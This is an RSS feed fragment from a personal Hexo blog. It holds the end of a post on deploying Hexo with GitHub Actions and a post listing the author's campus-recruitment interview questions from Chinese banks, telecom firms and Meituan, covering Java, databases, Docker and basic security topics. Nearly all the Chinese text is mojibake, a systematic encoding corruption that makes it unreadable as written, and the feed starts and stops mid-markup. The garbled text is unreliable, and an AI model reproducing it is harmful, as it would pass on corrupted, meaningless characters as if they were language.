class="string">test</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•å®Œæ¯•åå¯ä»¥ç›´æ¥åˆå¹¶åˆ°ä¸»åˆ†æ”¯ï¼Œæˆ–ä¿®æ”¹ Github Action çš„é…ç½®æ–‡ä»¶åæäº¤åˆ°ä¸»åˆ†æ”¯ã€‚</p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>æœ¬æ¥ä»¥ä¸ºåªæœ‰ç§æœ‰ä»“åº“å—åˆ°å½±å“ï¼Œæ²¡æƒ³åˆ°å…¬å¼€ä»“åº“ä¹Ÿå› ä¸ºé¢åº¦é—®é¢˜ä¸èƒ½ä½¿ç”¨ Travis CI äº†ï¼Œä¸å¾—ä¸æŠŠ Github Profile ä»“åº“çš„è‡ªåŠ¨æ›´æ–°è„šæœ¬ä¹Ÿè¿ç§»åˆ° Github Action ğŸ˜’</p><p>PSï¼šä»¥ä¸Šæ–¹æ³•çš„ç¼ºç‚¹æ˜¯æ›´æ”¹æ–‡ç« è·¯å¾„æˆ–éšè—æ—¶ï¼Œæ®‹ç•™çš„æ–‡ä»¶æ— æ³•è‡ªåŠ¨åˆ é™¤ã€‚</p>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Other/">Other</category>
      
      
      <category domain="https://jckling.github.io/tags/Github-Action/">Github Action</category>
      
      <category domain="https://jckling.github.io/tags/Hexo/">Hexo</category>
      
      
      <comments>https://jckling.github.io/2023/02/18/Other/Github%20Action%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%20Hexo%20%E5%8D%9A%E5%AE%A2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>23 å±Šç§‹æ‹›é¢è¯•æ€»ç»“</title>
      <link>https://jckling.github.io/2022/11/30/Notes/23%20%E5%B1%8A%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</link>
      <guid>https://jckling.github.io/2022/11/30/Notes/23%20%E5%B1%8A%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</guid>
      <pubDate>Wed, 30 Nov 2022 08:40:05 GMT</pubDate>
      
      <description>é“¶è¡Œã€è¿è¥å•†ã€äº’è”ç½‘ã€å¤–ä¼</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¤§è‡´å¯ä»¥åˆ†ä¸ºã€Œè¿è¥å•†&#x2F;é“¶è¡Œã€ä¸ã€Œè½¯ä»¶&#x2F;äº’è”ç½‘ã€ï¼Œç”µå•†ã€è‡ªåŠ¨é©¾é©¶ã€æ¸¸æˆç­‰å½’ç±»åˆ°ã€Œè½¯ä»¶&#x2F;äº’è”ç½‘ã€å½“ä¸­ã€‚å’Œ <a href="https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/">23 å±Šæš‘æœŸå®ä¹ é¢è¯•æ€»ç»“</a> ä¸€æ ·ï¼ŒæŒ‰<strong>ä¸€é¢</strong>æ—¶é—´é¡ºåºè¿›è¡Œç½—åˆ—ã€‚</p><h1 id="è¿è¥å•†-x2F-é“¶è¡Œ"><a href="#è¿è¥å•†-x2F-é“¶è¡Œ" class="headerlink" title="è¿è¥å•†&#x2F;é“¶è¡Œ"></a>è¿è¥å•†&#x2F;é“¶è¡Œ</h1><p>é“¶è¡Œä¼¼ä¹éƒ½åªæœ‰ä¸€è½®é¢è¯•ï¼Œä¸è¿‡æ”¶åˆ°çš„éƒ½æ˜¯å·®é¢ä½“æ£€ã€‚è¿è¥å•†é¢äº†æ²¡åç»­æ¶ˆæ¯å°±é»˜è®¤æŒ‚äº†ï¼ˆæ‘Šæ‰‹ï¼‰ã€‚</p><h2 id="ä¸­å›½ç§»åŠ¨ä¿¡æ¯æŠ€æœ¯ä¸­å¿ƒ"><a href="#ä¸­å›½ç§»åŠ¨ä¿¡æ¯æŠ€æœ¯ä¸­å¿ƒ" class="headerlink" title="ä¸­å›½ç§»åŠ¨ä¿¡æ¯æŠ€æœ¯ä¸­å¿ƒ"></a>ä¸­å›½ç§»åŠ¨ä¿¡æ¯æŠ€æœ¯ä¸­å¿ƒ</h2><p>è¿‡äº†å·®ä¸å¤šä¸€ä¸ªæœˆæ‰å‡ºç»“æœï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢ï¼ˆ10minï¼‰</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»ï¼Œæ•°æ®å¤„ç†æ˜¯æ€ä¹ˆåšçš„</li><li>ç”¨è¿‡çš„æ•°æ®åº“ï¼Œæ˜¯å¦åšè¿‡æ€§èƒ½è°ƒä¼˜</li><li>åé—®ï¼šå¤šä¹…å‡ºç»“æœ</li></ol><p><strong>äºŒé¢ï¼ˆ15minï¼‰</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>äºšé©¬é€Šå…¨æ ˆé¡¹ç›®ä»‹ç»ï¼Œå’Œå®éªŒå®¤é¡¹ç›®æ¯”è¾ƒ</li><li>å¸¸ç”¨çš„æ•°æ®åº“ï¼Œå…³æ³¨ç‚¹ï¼ˆè¯»å†™æ•ˆç‡ï¼‰</li><li>æ›´æƒ³å­¦æŠ€æœ¯è¿˜æ˜¯æœ¬èº«æŠ€æœ¯å°±å¾ˆå‰å®³ï¼ˆï¼Ÿå½“ç„¶æ˜¯å­¦æŠ€æœ¯æ¥çš„ï¼‰</li><li>åé—®ï¼šç»„ç»‡æ¶æ„<ul><li>è´¢åŠ¡ã€æ‹›æ–°ã€ç‰©æµç³»ç»Ÿ</li><li>ä¸“ä¸šã€ç³»ç»Ÿã€è¿ç»´</li><li>120+ äºº</li></ul></li></ol><h2 id="è”é€šè½¯ä»¶ç ”ç©¶é™¢"><a href="#è”é€šè½¯ä»¶ç ”ç©¶é™¢" class="headerlink" title="è”é€šè½¯ä»¶ç ”ç©¶é™¢"></a>è”é€šè½¯ä»¶ç ”ç©¶é™¢</h2><p>è¢«ã€Œæœ€ä¸æˆåŠŸçš„ç»å†ã€é—®å€’äº†ï¼Œè¿˜çœŸæ²¡æœ‰é‡åˆ°è¿‡é—®è¿™ä¸ªçš„ğŸ˜‚</p><p><strong>ä¸€é¢ï¼ˆ6minï¼‰</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>æœ€ä¸æˆåŠŸçš„ç»å†</li><li>é‡åˆ°å›°éš¾&#x2F;ç“¶é¢ˆï¼Œå¦‚ä½•è§£å†³ï¼ˆæ²Ÿé€šã€ä»£ç ï¼‰</li><li>å€¾å‘äºä»€ä¹ˆæ–¹å‘ï¼ˆå¼€å‘ï¼‰</li><li>æ¥å—å·¥ä½œçœ‹é‡çš„ç‚¹ï¼šå…¬å¸å£ç¢‘ã€å·¥ä½œåœ°ç‚¹ã€è–ªé…¬ç¦åˆ©</li><li>æ˜¯å¦æ¥å—è°ƒå‰‚</li></ol><h2 id="ä¸­å›½ç”µä¿¡å®‰å…¨å…¬å¸"><a href="#ä¸­å›½ç”µä¿¡å®‰å…¨å…¬å¸" class="headerlink" title="ä¸­å›½ç”µä¿¡å®‰å…¨å…¬å¸"></a>ä¸­å›½ç”µä¿¡å®‰å…¨å…¬å¸</h2><p>åº”è¯¥æ˜¯ã€Œå¤©ç¿¼å®‰å…¨ç§‘æŠ€ã€ï¼ŒåŒæ€»éƒ¨ï¼ˆåŒ—äº¬ã€æ±Ÿè‹ï¼‰ï¼Œç„¶åä¸¤è¾¹éƒ½é¢äº†ï¼Œæ¥åˆ°æ±Ÿè‹çš„ offerï¼Œå·²æ‹’ã€‚</p><h3 id="åŒ—äº¬"><a href="#åŒ—äº¬" class="headerlink" title="åŒ—äº¬"></a>åŒ—äº¬</h3><p><strong>ä¸€é¢</strong></p><ol><li>ç®—æ³•ï¼šæœ‰åºæ•°ç»„æŸ¥æ‰¾æ•°å­—</li><li>è®¡ç½‘ï¼šæµè§ˆå™¨è¿‡ç¨‹ã€DNS æŸ¥è¯¢æ–¹å¼ã€DNS åŠ«æŒ&#x2F;ç¼“å­˜æ±¡æŸ“ã€TLS è¿‡ç¨‹</li><li>æ“ä½œç³»ç»Ÿï¼šåœ°å€ç©ºé—´ç”±ä»€ä¹ˆå†³å®š</li><li>Linux å‘½ä»¤ï¼šæŸ¥æ‰¾å…³é”®å­— <code>grep</code>ï¼ŒæŸ¥çœ‹æ–‡ä»¶ã€æŸ¥çœ‹èµ„æº</li><li>Javaï¼šHashMap åº•å±‚ã€æ˜¯å¦çº¿ç¨‹å®‰å…¨ã€çº¿ç¨‹å®‰å…¨çš„å®ç°ç±»æ˜¯ä»€ä¹ˆã€æ€ä¹ˆå®ç°çš„ã€<code>synchronized</code> åº•å±‚ã€<code>volatile</code> åº•å±‚ã€çº¿ç¨‹æ± è¿‡ç¨‹</li><li>MySQLï¼šæ—¥å¿—åŠå…¶ä½œç”¨ã€MVCCã€ç´¢å¼•ã€B+ æ ‘å’Œ B æ ‘æ¯”è¾ƒã€è”åˆç´¢å¼•ä»€ä¹ˆæƒ…å†µå¤±æ•ˆã€æ…¢æŸ¥è¯¢ä¼˜åŒ–</li><li>Redisï¼šå¸¸è§æ•°æ®ç±»å‹ã€ä¸ºä»€ä¹ˆå¿«ã€å“¨å…µçš„ä½œç”¨</li><li>RPCï¼šgRPCã€Thriftã€Dubbo</li><li>æ˜¯å¦æœ‰ offerï¼Œé€‰æ‹©çš„ä¾æ®ï¼šå£ç¢‘ã€åœ°ç‚¹ã€å·¥ä½œæ°›å›´</li><li>åé—®<ul><li>å‡ è½®ï¼š2 é¢ + HR é¢</li><li>æŠ€æœ¯å¼€å‘ï¼ˆåŒ—äº¬ã€è‹å·ï¼‰ï¼ŒJava æŠ€æœ¯æ ˆä¸ºä¸»<ul><li>é›†å›¢ä¾§</li><li>æ”¿æ²»ï¼šå›½å®¶ã€ä¿¡é€šé™¢</li><li>äº§å“ã€å”®å‰ã€å”®åï¼šå®‰å…¨èµ„æºèƒ½åŠ›æ± ã€Java æ± ã€å®‰å…¨ä¿éšœã€è”é˜²è”æ£€</li></ul></li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»</li><li>å¦‚ä½•å­¦ä¹  Java</li><li>æ˜¯å¦çœ‹è¿‡ JDK API</li><li>å¦‚ä½•ä½¿ç”¨ Collections å®¹å™¨</li><li>Java ä¸­çš„å¿«æ’æ˜¯å“ªä¸ªå®ç°ï¼ˆArrays.sortï¼‰ï¼ŒCollections.sort ä½¿ç”¨å½’å¹¶</li><li>æœ‰ç”¨è¿‡ React å—ï¼Œè·¯ç”±å¦‚ä½•å®ç°ï¼Œjs compact å¦‚ä½•å®ç°</li><li>OpenStack éƒ½æœ‰å“ªäº›ç»„ä»¶ï¼Œäº†è§£ neutron å—</li><li>çº¿ç¨‹å®‰å…¨æ€ä¹ˆå®šä¹‰</li><li>è®¾è®¡æ¨¡å¼éƒ½æœ‰å“ªäº›</li><li>Dockerfile å¸¸ç”¨æŒ‡ä»¤</li><li>åé—®<ul><li>æ¶æ„ï¼šä¸€çº§åˆ†å…¬å¸ï¼Œé›†å›¢éƒ¨é—¨ï¼Œç±»ä¼¼åŒ—äº¬ç”µä¿¡</li><li>æ–°äººï¼šmentor å¸¦ï¼Œä¸»è¦æ˜¯åå°å¼€å‘</li></ul></li></ol><h3 id="æ±Ÿè‹"><a href="#æ±Ÿè‹" class="headerlink" title="æ±Ÿè‹"></a>æ±Ÿè‹</h3><p>äºŒé¢åéš”äº†ä¸‰å‘¨æ¥åˆ° HR é¢ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å®‰å…¨åˆ†ç±»ï¼šWeb å®‰å…¨ã€è½¯ä»¶å®‰å…¨</li><li>ç”¨äº†å“ªäº›å›½å¯†ç®—æ³•ï¼ˆSM2ã€SM3ï¼‰ç”¨åœ¨å“ªé‡Œï¼ˆTLSã€è¯ä¹¦ï¼‰</li><li>Java ç¨‹åºåˆ†æç³»ç»ŸåŸç†ä»‹ç»ï¼ˆNeo4jï¼‰</li><li>docker å¸¸ç”¨å‘½ä»¤ã€docker-compose ç®€å•ä»‹ç»ã€æ˜¯å¦äº†è§£ k8sï¼ˆç”¨è¿‡ Kolla-Ansibleï¼‰</li><li>Java çš„é›†åˆï¼ŒHashMap åº•å±‚åŸç†ï¼Œæ‰©å®¹æœºåˆ¶</li><li>ç”¨è¿‡å“ªäº› Java æ¡†æ¶ï¼Œæ˜¯å¦äº†è§£ Spring Boot ä¹‹ç±»çš„ </li><li>B+ æ ‘ç”¨åœ¨å“ªé‡Œï¼šMySQL ç´¢å¼•ã€ç”¨é€”ã€ä¼˜ç‚¹ã€æ—¶é—´å¤æ‚åº¦</li><li>è®¾è®¡æ¨¡å¼ï¼šStringBuilder æ˜¯å»ºé€ è€…æ¨¡å¼</li><li>åé—®<ul><li>ç»„ç»‡æ¶æ„ï¼šåŒæ€»éƒ¨ï¼ˆåŒ—äº¬ã€è‹å·ï¼‰ï¼Œè‹å·æ³¨å†Œ</li><li>ä¸šåŠ¡ï¼ˆç½‘ç»œå®‰å…¨ï¼‰ï¼šå®‰å…¨åº”ç”¨&#x2F;å¹³å°å¼€å‘ã€ä¾›æ”»é˜²</li><li>é¢è¯•ï¼šæŠ€æœ¯ + é¢†å¯¼ + HR</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å®¶ä¹¡æ˜¯å“ªé‡Œçš„</li><li>å·¥ä½œåœ°ç‚¹é€‰æ‹©</li><li>æ˜¯ä¸æ˜¯å…šå‘˜</li><li>æœ‰ä»€ä¹ˆ offer</li><li>ä»‹ç» Java ç¨‹åºåˆ†æç³»ç»Ÿï¼Œå®é™…çš„åº”ç”¨æ•ˆæœ</li><li>ä»‹ç»å…¨æ ˆé¡¹ç›®ï¼Œè§£å†³çš„é—®é¢˜</li><li>äº†è§£å“ªäº›å‰ç«¯å¯è§†åŒ–å·¥å…·</li><li>ARP åè®®æ˜¯å“ªå±‚çš„</li><li>æœ‰ä»€ä¹ˆ Web æ”»å‡»</li><li>åé—®<ul><li>åŒ—äº¬ã€è‹å·çš„éƒ½é¢äº†ï¼ˆï¼Ÿï¼‰</li><li>å¤§çº¦ 10 å¤©å†…å‡ºç»“æœ</li></ul></li></ol><p><strong>HR é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å®ä¹ æ”¶è·</li><li>å…¬å¸ä»‹ç»<ul><li>15 å¹´ï¼Œç½‘ç»œå®‰å…¨äº§å“ä¸­å¿ƒï¼ˆç ”å‘ã€è¿è¥ï¼‰</li><li>ä¸šåŠ¡ï¼šäº‘ç½‘ã€å®‰å…¨ã€å¤–éƒ¨&#x2F;å†…éƒ¨</li><li>ä¼˜åŠ¿ï¼šå„æ–­èµ„æº</li></ul></li><li>åé—®ï¼š3-5 å¤©å‡ºç»“æœ</li></ol><h2 id="å»ºä¿¡é‡‘ç§‘"><a href="#å»ºä¿¡é‡‘ç§‘" class="headerlink" title="å»ºä¿¡é‡‘ç§‘"></a>å»ºä¿¡é‡‘ç§‘</h2><p>è¿™ä¸ªä¹Ÿè¿‡äº†å·®ä¸å¤šä¸€ä¸ªæœˆæ‰å‡ºç»“æœï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä¸ºä»€ä¹ˆæƒ³æ¥ä¸Šæµ·</li><li>é¡¹ç›®ä¸­æœ€æœ‰æˆå°±æ„Ÿçš„äº‹æƒ…</li><li>é“¾è·¯è¿½è¸ªç³»ç»Ÿä»‹ç»</li><li>SM2 ç®—æ³•ä»‹ç»ã€SM3 ç®—æ³•æ˜¯å¹²å˜›çš„</li><li>è¿˜åšè¿‡å“ªäº›ä¸å®‰å…¨ç›¸å…³çš„é¡¹ç›®</li><li>ä¿¡æ¯&#x2F;è½¯ä»¶å®‰å…¨è€ƒè™‘å“ªäº›æ–¹é¢ï¼Œæˆ–è€…æœ‰ä»€ä¹ˆç½‘ç»œæ”»å‡»</li><li>æœ‰æ²¡æœ‰è®ºæ–‡&#x2F;ä¸“åˆ©</li><li>Java ä¸­çš„é”ä»‹ç»ä¸€ä¸‹ï¼Œ<code>synchronized</code> çš„æ€§èƒ½å¦‚ä½•ï¼Œæ˜¯ä»€ä¹ˆç±»å‹çš„é”</li><li>åé—®ï¼šä¸šåŠ¡<ul><li>å…¨èµ„å­å…¬å¸ï¼Œäº‹ä¸šç¾¤&#x2F;ä¸­å¿ƒï¼Œéƒ¨é—¨ 20+</li><li>æ–°äººåˆ†é…ï¼šæ ¹æ®å›¢é˜Ÿ&#x2F;é¡¹ç›®éœ€æ±‚&#x2F;å‘å±•ç›®æ ‡</li></ul></li></ol><h2 id="ä¸­å›½å†œä¸šé“¶è¡Œç ”å‘ä¸­å¿ƒ"><a href="#ä¸­å›½å†œä¸šé“¶è¡Œç ”å‘ä¸­å¿ƒ" class="headerlink" title="ä¸­å›½å†œä¸šé“¶è¡Œç ”å‘ä¸­å¿ƒ"></a>ä¸­å›½å†œä¸šé“¶è¡Œç ”å‘ä¸­å¿ƒ</h2><p>æ€»è¡ŒåŒæœºä½ç«™ç«‹é¢è¯•ï¼Œå·®é¢ä½“æ£€ï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä»‹ç»å…¨æ ˆé¡¹ç›®ï¼Œç”¨åˆ°çš„æŠ€æœ¯ç‚¹</li><li>ä»‹ç»é“¾è·¯è¿½è¸ªï¼Œç”¨åˆ°çš„æŠ€æœ¯ç‚¹</li><li>ä»‹ç» Java ç¨‹åºåˆ†æç³»ç»Ÿï¼Œé™¤äº†ååºåˆ—åŒ–æ¼æ´è¿˜èƒ½æ£€æµ‹ä»€ä¹ˆï¼ˆè¯­å¥çº§åˆ«ã€å…¶ä»–è¯­è¨€æ‰©å±•ï¼‰</li><li>SQL æ³¨å…¥ä¸é˜²æŠ¤ã€XSS æ¼æ´</li><li>dockerï¼šä¸è™šæ‹Ÿæœºçš„åŒºåˆ«ã€å®¹å™¨ä¸é•œåƒçš„å…³ç³»ã€ä¸è™šæ‹Ÿæœºçš„å®‰å…¨æ€§å·®å¼‚</li><li>æ¥è§¦è¿‡çš„æ•°æ®åº“</li><li>Java ç±»åŠ è½½æœºåˆ¶</li><li>å¯¹é“¶è¡Œçš„çœ‹æ³•</li></ol><h2 id="äº¤é€šé“¶è¡Œæ€»è¡Œé‡‘èç§‘æŠ€éƒ¨é—¨"><a href="#äº¤é€šé“¶è¡Œæ€»è¡Œé‡‘èç§‘æŠ€éƒ¨é—¨" class="headerlink" title="äº¤é€šé“¶è¡Œæ€»è¡Œé‡‘èç§‘æŠ€éƒ¨é—¨"></a>äº¤é€šé“¶è¡Œæ€»è¡Œé‡‘èç§‘æŠ€éƒ¨é—¨</h2><p>é¢è¯•ï¼Œæµ‹è¯„ï¼ŒèƒŒè°ƒï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å¤šçº¿ç¨‹ç¼–ç¨‹ï¼ˆThreadã€Runnable&#x2F;Callableï¼‰</li><li>docker å‘½ä»¤ï¼ŒLinux&#x2F;Windows ä¸Šéƒ½æœ‰ç”¨è¿‡</li><li>Linux å‘½ä»¤ï¼šfindã€rmã€mv</li><li>go ç›¸å…³å‘½ä»¤ï¼šåªè®°å¾— <code>go mod</code></li><li>MySQLï¼Œç™½è¯è§£é‡Šäº‹åŠ¡ï¼Œå¦‚ä½•å®ç°ä¸€è‡´æ€§ï¼ˆMVCCã€åŠ é”ï¼‰ï¼Œæ…¢æŸ¥è¯¢ä¼˜åŒ–æ–¹å¼</li><li>æ•°æ®åº“è¡¨æ·»åŠ åˆ—ç”¨ä»€ä¹ˆæŒ‡ä»¤ï¼ˆALTERï¼‰</li><li>æœ‰ç”¨ Redis å†™é˜»å¡é˜Ÿåˆ—å—</li><li>è¿›ç¨‹é—´é€šä¿¡æ–¹å¼</li><li>ä¸ºä»€ä¹ˆé€‰æ‹©ä¸Šæµ·&#x2F;é‡‘è</li></ol><h2 id="ä¸­å›½ç§»åŠ¨ä¸Šæµ·äº§ä¸šç ”ç©¶é™¢"><a href="#ä¸­å›½ç§»åŠ¨ä¸Šæµ·äº§ä¸šç ”ç©¶é™¢" class="headerlink" title="ä¸­å›½ç§»åŠ¨ä¸Šæµ·äº§ä¸šç ”ç©¶é™¢"></a>ä¸­å›½ç§»åŠ¨ä¸Šæµ·äº§ä¸šç ”ç©¶é™¢</h2><p>è¿˜çœŸæœ‰äººä¼šé—®æœ‰æ²¡æœ‰å¯¹è±¡å•ŠğŸ˜… æ—¶éš”ä¸€ä¸ªæœˆæ”¶åˆ°æ„å‘ï¼Œå·²æ‹’ã€‚ä¸‰å‘¨åæ¥åˆ°å›è®¿ç”µè¯ï¼Œç‚¹ä¸ªèµã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä»‹ç»æœ€æœ‰æŒ‘æˆ˜æ€§çš„é¡¹ç›®</li><li>ä¸‰åˆ°äº”å¹´èŒä¸šè§„åˆ’</li><li>ä¸šä½™çˆ±å¥½</li><li>ä¸‰ä¸ªå½¢å®¹è¯æè¿°è‡ªå·±ï¼Œæœ‹å‹æ€ä¹ˆè¯„ä»·è‡ªå·±çš„</li><li>é‡åˆ°å¾ˆéš¾æ²Ÿé€šçš„ä¸Šçº§æˆ–åŒäº‹å’‹åŠ</li><li>æœ‰å“ªäº›åœ°æ–¹çš„ offer</li><li>æ˜¯å¦æœ‰ç”·æœ‹å‹</li><li>åå°„ç”¨åœ¨å“ªäº†å“ªé‡Œï¼Œä»‹ç» Java ç¨‹åºåˆ†æç³»ç»Ÿ</li><li>å¦‚ä½•åˆ†æè°ƒç”¨ï¼Œdfs&#x2F;bfsï¼Ÿ</li><li>åå°„è·å–ç±»æœ‰å‡ ç§æ–¹å¼ï¼ˆ3 ç§ï¼‰</li></ol><h2 id="åŒ—äº¬ç§»åŠ¨"><a href="#åŒ—äº¬ç§»åŠ¨" class="headerlink" title="åŒ—äº¬ç§»åŠ¨"></a>åŒ—äº¬ç§»åŠ¨</h2><p>å®‰æ’åœ¨å‘¨æ—¥ä¸Šåˆï¼Œæ¯”è¾ƒæ•·è¡ã€‚</p><p><strong>ä¸€é¢ï¼ˆ8minï¼‰</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»ï¼ˆæ¯•ä¸šæ—¶é—´ã€ç”Ÿæºåœ°ï¼‰</li><li>å½¢å®¹è‡ªå·±ã€å†…å‘&#x2F;å¤–å‘ã€å’Œåˆ«äººçš„ç›¸å¤„æ¨¡å¼ï¼ˆä¸»åŠ¨&#x2F;è¢«åŠ¨ï¼‰</li><li>äºšé©¬é€Šå®ä¹ çš„æ”¶è·</li><li>å·¥ä½œä¸­å¯ä»¥ç«‹å³ä¸Šæ‰‹çš„åœ°æ–¹ï¼Œè¿˜æ¬ ç¼ºä»€ä¹ˆæŠ€èƒ½</li><li>è°ƒå‰‚ï¼ˆæŠ€æœ¯å²—å³å¯ï¼‰ã€éƒŠåŒºï¼ˆæ— æ‰€è°“ï¼‰ã€æˆ·å£ï¼ˆæœ€å¥½æœ‰ï¼‰ã€æŠ•é€’å…¶ä»–å²—ä½ï¼ˆä¸è®°å¾—ï¼‰</li></ol><h2 id="å·¥å•†é“¶è¡Œè½¯ä»¶å¼€å‘ä¸­å¿ƒ"><a href="#å·¥å•†é“¶è¡Œè½¯ä»¶å¼€å‘ä¸­å¿ƒ" class="headerlink" title="å·¥å•†é“¶è¡Œè½¯ä»¶å¼€å‘ä¸­å¿ƒ"></a>å·¥å•†é“¶è¡Œè½¯ä»¶å¼€å‘ä¸­å¿ƒ</h2><p>æŠ•é€’äº†ä¸Šæµ·å’Œæˆéƒ½ï¼Œæ‹’ç»äº†æˆéƒ½çš„é¢è¯•ã€‚æ—¶éš”ä¸€ä¸ªæœˆæ”¶åˆ°ä½“æ£€é€šçŸ¥ï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿ<ul><li>ä»‹ç»</li><li>æ˜¯å¦å·²ä¸Šçº¿</li><li>æŠ€æœ¯æ ˆ</li></ul></li><li>ä¸ºä»€ä¹ˆæƒ³æ¥ä¸Šæµ·</li><li>åé—®ï¼šä¸šåŠ¡<ul><li>é‡‘èäº§å“</li><li>è‡ªç ”ï¼Œç±»ä¼¼ SpringBoot</li><li>MySQLã€åä¸ºäº‘</li><li>å¤§æ•°æ®ã€Hadoop</li></ul></li></ol><h2 id="ä¸­å›½å…‰å¤§é“¶è¡Œä¿¡ç”¨å¡ä¸­å¿ƒ"><a href="#ä¸­å›½å…‰å¤§é“¶è¡Œä¿¡ç”¨å¡ä¸­å¿ƒ" class="headerlink" title="ä¸­å›½å…‰å¤§é“¶è¡Œä¿¡ç”¨å¡ä¸­å¿ƒ"></a>ä¸­å›½å…‰å¤§é“¶è¡Œä¿¡ç”¨å¡ä¸­å¿ƒ</h2><p>çº¦ä¸‰å‘¨åæ”¶åˆ°äºŒé¢ï¼Œå·²æ‹’ã€‚æ­¤å¤–ï¼Œè¿˜æŠ•é€’äº†ã€Œä¸­å›½å…‰å¤§é“¶è¡Œæ€»è¡Œä¿¡æ¯ç§‘æŠ€éƒ¨ã€ï¼Œé¢è¯•æ‹’äº†ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é“¾è·¯è¿½è¸ªç³»ç»Ÿ Jaeger ä¸ Dapr çš„åŒºåˆ«ï¼Œä¾µå…¥æ€§å¦‚ä½•<ul><li>ä¸äº†è§£ Daprï¼Œåº”è¯¥æ˜¯é’ˆå¯¹ Java çš„</li><li>OpenStack äº‘å¹³å°æ˜¯ Python å¼€å‘çš„</li></ul></li><li>åŒºå—é“¾ç”¨çš„ä»€ä¹ˆå…±è¯†ç®—æ³•ï¼Œè§£é‡Šä¸‹ HTTPS</li><li>é€šä¿—åœ°æè¿°ä¸€ä¸‹äºšé©¬é€Šçš„å…¨æ ˆé¡¹ç›®</li></ol><h1 id="è½¯ä»¶-x2F-äº’è”ç½‘"><a href="#è½¯ä»¶-x2F-äº’è”ç½‘" class="headerlink" title="è½¯ä»¶&#x2F;äº’è”ç½‘"></a>è½¯ä»¶&#x2F;äº’è”ç½‘</h1><h2 id="ç¾å›¢"><a href="#ç¾å›¢" class="headerlink" title="ç¾å›¢"></a>ç¾å›¢</h2><p>å‰ 5 è½®é¢çš„æ˜¯å¤–å–æŸœä¸šåŠ¡ã€å…±äº«å•è½¦ä¸šåŠ¡çš„åç«¯å¼€å‘å·¥ç¨‹å¸ˆï¼Œæœ€å 1 è½®é¢çš„æ˜¯ä¼˜é€‰ä¸šåŠ¡çš„è½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆã€‚å¯æ‹‰å€’å§ğŸ™„</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>éƒ¨é—¨ä»‹ç»</li><li>é“¾è·¯è¿½è¸ª<ul><li>å¦‚ä½•ä¼ é€’è¿½è¸ªä¿¡æ¯</li><li>å¦‚ä½•å®ç°å¤šçº¿ç¨‹è¿½è¸ª</li></ul></li><li>æ¶ˆæ¯é˜Ÿåˆ—<ul><li>rabbitmq æœ‰å‡ ç§æ¨¡å¼</li><li>æ¶ˆæ¯å¤„ç†å¤±è´¥æ€ä¹ˆåŠ</li></ul></li><li>ES</li><li>é—®é¢˜<ul><li>SQL</li><li>dp</li><li>çº¿æ®µåˆ‡åˆ†ä¸ºä¸‰è§’å½¢çš„æ¦‚ç‡</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>è®²è¿°æœ€ç†Ÿæ‚‰çš„é¡¹ç›®</li><li>ä¸­é—´ä»¶ï¼ˆæ¶ˆæ¯é˜Ÿåˆ—ï¼‰<ul><li>å¦‚ä½•å®ç°</li><li>ä¼ è¾“æ•°æ®</li></ul></li><li>RPC<ul><li>ä¼ è¾“æ•°æ®</li><li>ä»å¤´å®ç° RPC ä¼šæ€ä¹ˆå†™</li></ul></li><li>è®¾è®¡æ¨¡å¼<ul><li>è£…é¥°å™¨</li><li>é€‚é…å™¨</li></ul></li><li>é¢˜ç›®<ul><li>SQL</li><li>åŒºé—´åˆå¹¶ï¼ˆä¸è®©ç”¨ C++ï¼Œç”¨ Java å†™ï¼‰</li></ul></li></ol><p><strong>ä¸‰é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>åŒºå—é“¾<ul><li>RSA ç®—æ³•</li><li>å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†</li><li>CA é»‘åå•åŠŸèƒ½ï¼ˆèŠ‚ç‚¹é»‘åå•ï¼Œæ‹’ç»èŠ‚ç‚¹çš„è¿æ¥ï¼‰</li><li>å…¥ç½‘æµç¨‹</li></ul></li><li>Java 